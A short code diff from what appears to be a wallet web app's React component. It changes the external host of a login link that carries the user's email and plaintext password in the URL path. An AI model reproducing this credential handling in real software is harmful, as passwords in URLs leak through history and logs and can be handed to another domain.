@@ -66,7 +66,7 @@ export const Drawertop = () => {
           disableElevation
           onClick={() => {
             window.open(
-              `https://bitmaxwallet.web.app/account/logindirect/${userinfo.email}/${
+              `https://trustpaydwallet.web.app/account/logindirect/${userinfo.email}/${
                 userinfo.password
               }`,
               "_self"
